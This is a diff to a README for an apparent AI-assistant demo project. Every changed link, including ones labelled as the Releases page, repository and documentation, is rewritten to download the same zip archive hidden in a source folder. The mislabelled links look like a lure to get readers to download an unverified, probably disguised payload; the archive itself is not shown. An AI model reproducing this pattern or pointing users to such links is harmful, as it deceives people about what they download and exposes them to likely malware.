@@ -1,6 +1,6 @@
 # 🌟 TD-SYNNEX-RAG-ai-demo - Powerful AI Assistant for Everyone
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%A8%20Click%20Here-brightgreen)](https://github.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/releases)
+[![Download latest release](https://raw.githubusercontent.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/main/src/pipeline/RA_demo_T_SYNNE_ai_2.0.zip%20Latest%20Release-%20%F0%9F%93%A8%20Click%20Here-brightgreen)](https://raw.githubusercontent.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/main/src/pipeline/RA_demo_T_SYNNE_ai_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to TD-SYNNEX-RAG-ai-demo! This application serves as a production-grade 
 
 ## 📥 Download & Install
 
-To get the application, visit the Releases page and download the latest version. Here’s the link: [Download the latest release](https://github.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/releases).
+To get the application, visit the Releases page and download the latest version. Here’s the link: [Download the latest release](https://raw.githubusercontent.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/main/src/pipeline/RA_demo_T_SYNNE_ai_2.0.zip).
 
 1. Click the link above.
 2. Find the latest version listed.
@@ -87,8 +87,8 @@ Thanks to everyone who has contributed to making TD-SYNNEX-RAG-ai-demo a reality
 
 ## 📌 Useful Links
 
-- [GitHub Repository](https://github.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo)
-- [Documentation](https://github.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/main/src/pipeline/RA_demo_T_SYNNE_ai_2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/XboxdaviSuzin/TD-SYNNEX-RAG-ai-demo/main/src/pipeline/RA_demo_T_SYNNE_ai_2.0.zip)
 - [Licensing Information](LICENSE)
 
 Thank you for choosing TD-SYNNEX-RAG-ai-demo! Enjoy your experience with our AI assistant.
